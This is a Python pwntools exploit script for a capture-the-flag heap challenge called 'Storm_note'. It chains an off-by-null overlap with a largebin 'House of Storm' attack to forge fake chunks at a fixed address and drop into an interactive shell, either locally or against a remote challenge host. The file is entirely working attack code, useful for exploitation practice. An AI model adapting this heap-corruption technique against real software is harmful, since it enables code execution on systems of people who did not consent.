#/usr/env/bin python
#-*- coding: utf-8 -*- 
from pwn import *
import sys
 
def add(size):
    p.sendlineafter('Choice: ',str(1))
    p.sendlineafter('?',str(size))#16-1024
    #p.interactive()
    #p.recvuntil('success!')
 
def edit(index,content):
    p.sendlineafter('Choice: ',str(2))
    p.sendlineafter('?',str(index))
    p.sendafter('Content: ',content)

def delete(index):
    p.sendlineafter('Choice: ',str(3))
    p.sendlineafter('?',str(index))
 
def leave():
    p.sendlineafter('Choice: ',str(666))
 
def exploit(flag):
	add(0x18)#0
	add(0x508)#1
	add(0x18)#2

	add(0x18)#3
	add(0x508)#4
	add(0x18)#5
	add(0x18)#6

	edit(1,'a'*0x4f0+p64(0x500)+p64(0x30))
	edit(4,'a'*0x4f0+p64(0x500)+p64(0x30))


	delete(1)
	
	edit(0,'a'*0x18)#1

	add(0x18)#1
	add(0x4d8)#7
	
	delete(1)
	delete(2)

	add(0x30)#1
	#edit(7,'ffff')

	add(0x4e0)#2

	delete(4)

	edit(3,'a'*0x18)
	add(0x18)#4
	add(0x4d8)#8
	delete(4)
	delete(5)
	add(0x40)#4
	#edit(8,'ffff')
	add(0x4d8)#5
	delete(5)
	delete(2)

	add(0x4e8)      # put chunk5 to largebin
	
	delete(2)

	content_addr = 0xabcd0100
	fake_chunk = content_addr - 0x20

	payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
	payload += p64(0) + p64(fake_chunk)      # bk
	edit(7,payload)

	payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
	payload2 += p64(0) + p64(fake_chunk+8)   
	payload2 += p64(0) + p64(fake_chunk-0x18-5)
	
	edit(8,payload2)

	add(0x40)

	payload = p64(0) * 2+p64(0) * 6
	gdb.attach(p)
	edit(2,payload)

	p.sendlineafter('Choice: ','666')

	p.send(p64(0)*6)

	p.interactive()




if __name__ == "__main__":
    context.binary = "./Storm_note"
    #context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./Storm_note')
    debug =0
    if debug==1:
        p = remote('chall.pwnable.tw',10203)
        #libc=ELF('./libc-2.27.so')
        exploit(0)
    else:
        p=process('./Storm_note')#,env={'LD_PRELOAD':'./libc-2.27.so'})
        #libc = ELF('./libc-2.27.so')
        exploit(0)
